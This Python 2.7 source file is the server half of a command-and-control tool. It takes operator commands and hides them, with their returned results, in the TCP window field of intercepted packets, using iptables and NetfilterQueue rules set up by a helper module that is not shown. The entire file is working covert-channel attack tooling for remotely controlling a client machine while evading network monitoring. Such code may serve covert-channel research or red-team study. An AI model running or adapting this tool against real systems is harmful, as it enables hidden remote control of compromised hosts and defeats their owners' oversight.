#!/usr/bin/env python2.7
#
# @desc This is the interactive Command and Control (C2) script. It will run continuasly and ask for 
# input commands. Any commands will be sent via covert channel to the client. The results of sent 
# commands will be extracted from the covert channel and printed.
#
# @author Evan Palmiotti
# @required scapy, time, subprocess, netfilterqueue, steghelper.py
########################################################################################################

from scapy.all import *
import time
import subprocess
from netfilterqueue import NetfilterQueue
from steghelper import *
 
QUEUE=1            # The IPTABLES Queue to send intercepted traffic to
dst='172.16.226.1' # Change this as needed to reflect C2 server (can be a host name)
IFACE='ens33'      # interface to send and recieve on
M_ARRAY=[]         # Array to store the message to send
M_INDEX=0          # Current processing index in the message array
ENDCHAR=65535      # Character to notate the begging and end of a message
                   # (this MUST be the same value for server and client)
ISREADING=False    # Boolean value to tell if a message is incoming 
R_ARRAY=''         # Array to store recieved data

#
# @desc extracts all packets from the queue filled by the iptables rules created in steghelper.py
# @return none
#
def interceptor():
    print("intercepting...\n")
    nfqueue = NetfilterQueue()
    nfqueue.bind(QUEUE, categorizer)
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        pass

#
# @desc categorizes packets into incoming or outgoing and calls their respective handling functions
# @param packet - the raw packet intercepted
# @return none
#
def categorizer(packet):
    #print(packet)
    spacket = IP(packet.get_payload())
    if spacket.src == dst:
        #print("\nINCOMING")
        reader(packet, spacket)
    else:
        #print("\nOUTGOING")
        injector(packet, spacket)

#
# @desc reads an incoming packet and stores any relevant data from the TCP window length header
# @param packet - the raw packet to be accepted as normal traffic
# @param spacket - the scapy packet to be analyzed for data
# @return none
#
def reader(packet, spacket):
    global ENDCHAR, R_ARRAY, ISREADING
    msg = spacket['TCP'].window
    
    if msg == ENDCHAR:
        if not ISREADING:
            print("Now Reading")
            ISREADING=True
        else:
            print("###### RECIEVED WHOLE MESSAGE: \n"+R_ARRAY+'\n')
            R_ARRAY=''
            ISREADING=False

    elif ISREADING:
        msg = '{:04x}'.format(msg)
        if '00' in msg:
            msg = msg[2::]
        msg = msg.decode('hex')

        R_ARRAY+=msg
    
    packet.accept()

#
# @desc injects data into outgoing packets if a message needs to be sent
# @param packet - original raw packet
# @param spacket - original scapy packet
# @return none
#
def injector(packet, spacket):
    
    global M_ARRAY, M_INDEX
    
    if M_INDEX < len(M_ARRAY):
        msg = M_ARRAY[M_INDEX]
        M_INDEX+=1
        
        newpkt = IP(dst=spacket.dst,
                src=spacket.src)/TCP(sport=spacket['TCP'].sport,
                        dport=spacket['TCP'].dport,
                        seq=spacket['TCP'].seq,
                        ack=spacket['TCP'].ack,
                        flags=spacket['TCP'].flags,
                        window=msg)/spacket['TCP'].payload
        payload = bytes(newpkt)
        packet.set_payload(payload)
        if M_INDEX >= len(M_ARRAY):
            print('done')
            M_ARRAY=[]

    packet.accept()

#
# @desc asks the user for a command to be sent to the client
# @return none
#
def interface():
    global M_INDEX
    msg = -99999999999
    while msg != '0':
        try:
            time.sleep(0.3)
            #print(M_INDEX)
            #print(M_ARRAY)
            if M_INDEX >= len(M_ARRAY) and not ISREADING:
                msg = raw_input("Enter message to send (0 = quit): ")
                if msg != '0':
                    print('starting sending')
                    M_INDEX=0
                    msg=compiler(msg, ENDCHAR)
                    M_ARRAY.extend(msg)
                    #while not ISREADING:
                        #time.sleep(0.2)
        except KeyboardInterrupt:
            pass
    exit()

#
# @main
# @desc write iptables rules, start up the interface loop as a thread, start up the interceptor loop
# @return
#
def main():
    ipstat(IFACE)

    handleIptables(dst, QUEUE)

    
    b = threading.Thread(name='interface', target=interface)
    b.deamon = True
    b.start()

    interceptor()

if __name__ == '__main__':
    main()
